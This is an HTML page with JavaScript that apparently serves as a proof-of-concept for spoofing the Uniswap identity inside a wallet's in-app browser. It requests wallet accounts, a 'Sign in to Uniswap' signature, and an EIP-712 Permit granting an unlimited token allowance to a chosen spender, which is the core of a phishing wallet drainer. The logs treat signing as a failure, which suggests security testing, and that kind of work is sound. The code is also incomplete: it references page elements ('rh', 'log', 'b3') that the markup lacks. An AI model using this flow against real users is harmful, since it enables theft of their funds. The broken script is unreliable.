<body style="font:15px/1.5 -apple-system,monospace;padding:18px;background:#0b0b0f;color:#0f0">

<button id="b1" style="font-size:17px;padding:14px;margin:6px 0;width:100%;background:#FF007A;color:#fff;border:0;border-radius:8px">1) Connect wallet (eth_requestAccounts)</button>
<button id="b2" style="font-size:17px;padding:14px;margin:6px 0;width:100%;background:#222;color:#fff;border:1px solid #FF007A;border-radius:8px">2) personal_sign ("Sign in to Uniswap")</button>

<script>
var ACC = null;
function L(m){var e=document.getElementById('log');e.innerText += "\n"+m;}
function toHex(s){return "0x"+Array.prototype.map.call(s,function(c){return c.charCodeAt(0).toString(16).padStart(2,'0');}).join("");}
document.getElementById('rh').innerText = location.host;

function waitProvider(cb,n){
  n = n||0;
  if (window.ethereum){ cb(window.ethereum); return; }
  if (n>40){ L("NO window.ethereum after wait — not in MetaMask bridged WebView"); return; }
  setTimeout(function(){waitProvider(cb,n+1);},150);
}
waitProvider(function(eth){
  L("window.ethereum present. isMetaMask="+(eth.isMetaMask));
  L("REAL origin (location.href)="+location.href);
});

document.getElementById('b1').onclick = function(){
  if(!window.ethereum){L("no provider");return;}
  L("-> eth_requestAccounts (expect CONNECT sheet; verify it says 'Uniswap')");
  window.ethereum.request({method:'eth_requestAccounts'}).then(function(a){
    ACC = a && a[0];
    L("CONNECTED account="+ACC);
  }).catch(function(e){L("connect err: "+(e&&e.message?e.message:e));});
};

document.getElementById('b2').onclick = function(){
  if(!window.ethereum){L("no provider");return;}
  var addr = ACC || "0x0000000000000000000000000000000000000000";
  var msg = toHex("Sign in to Uniswap\nNonce: 84217");
  L("-> personal_sign (expect SIGN sheet; verify it says 'Uniswap', NOT "+location.host+")");
  window.ethereum.request({method:'personal_sign',params:[msg,addr]}).then(function(s){
    L("SIGNED (should have been rejected!): "+s);
  }).catch(function(e){L("sign rejected/err (expected — we reject): "+(e&&e.message?e.message:e));});
};

document.getElementById('b3').onclick = function(){
  if(!window.ethereum){L("no provider");return;}
  var addr = ACC || "0x0000000000000000000000000000000000000000";
  var td = JSON.stringify({
    types:{EIP712Domain:[{name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],
      Permit:[{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}]},
    primaryType:"Permit",
    domain:{name:"Uniswap",version:"1",chainId:1,verifyingContract:"0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"},
    message:{owner:addr,spender:"0x000000000000000000000000000000000000dEaD",value:"115792089237316195423570985008687907853269984665640564039457584007913129639935",nonce:0,deadline:9999999999}
  });
  L("-> eth_signTypedData_v4 permit (expect TYPED-SIGN sheet; verify 'Uniswap')");
  window.ethereum.request({method:'eth_signTypedData_v4',params:[addr,td]}).then(function(s){
    L("TYPED SIGNED (should have been rejected!): "+s);
  }).catch(function(e){L("typed-sign rejected/err (expected): "+(e&&e.message?e.message:e));});
};
</script>
